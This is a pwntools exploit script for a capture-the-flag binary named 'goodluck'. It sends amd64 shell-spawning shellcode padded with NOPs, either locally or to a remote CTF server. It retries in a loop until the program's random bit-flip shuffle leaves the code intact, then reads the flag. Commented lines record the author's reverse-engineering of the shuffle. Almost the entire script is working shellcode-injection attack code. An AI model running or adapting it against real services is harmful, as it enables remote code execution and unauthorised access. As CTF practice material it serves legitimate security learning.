from pwn import *
import sys
import time
from math import *
from ctypes import CDLL


#   for (local_c = 0; local_c < len * 8; local_c = local_c + 1) {
#     rand = ::rand();
#     iVar2 = local_c;
#     to_shuffle[iVar2 >> 3] =
#          to_shuffle[iVar2 >> 3] ^ (rand % (len >> 3) == 0) << ((byte)local_c & 7);
#   }
#   return 0;
# }


# I was doing this for a LOT of time thinking I had to flip the bytes
# def shuffle(libc, asm_sh, length):
# 	to_shuffle = bytearray(asm_sh)
# 	for local_c in range(0, length * 8):
# 		rand = libc.rand()
# 		iVar2 = local_c
# 		to_shuffle[iVar2 >> 3] = to_shuffle[iVar2 >> 3] ^ ((rand % (length >> 3) == 0) << (local_c & 7))
# 	return to_shuffle

context.arch = 'amd64'

exit = False
while not exit:
	#libc = CDLL("libc.so.6")
	# The binary is using the clock time in ns as seed for srand
	# clock_gettime(1,(timespec *)local_28);
  	# srand(local_28._8_4_);
	
    # Use time.time_ns() to get the current time in ns and get the bytes from 0 to 4
	#libc.srand(time.time_ns() & 0xffffffff)

	if(len(sys.argv) > 1):
		if(sys.argv[1] == '--debug'):
			p = process("./goodluck")
			gdb.attach(p, """
			b *play+601
			"""	)
			input("wait...")
		elif(sys.argv[1] == '--strace'):
			p = process(["strace", "./goodluck"])
		elif(sys.argv[1] == '--remote'):
			p = remote("bin.ctf.offdef.it", 3010)
	else:
		p = process("./goodluck")

	asm_sh = asm(pwnlib.shellcraft.amd64.linux.sh())

	asm_sh = asm_sh + b'\x90' * (0x300 - len(asm_sh))
	
	#asm_sh_shuffle = shuffle(libc, asm_sh, len(asm_sh))

	p.send(asm_sh)
	p.recv()
	time.sleep(0.1)
	
	try:
		p.sendline(b'cat flag')
		flag=p.recv()
		print(flag)
		exit = True
	except:
		p.close()
		continue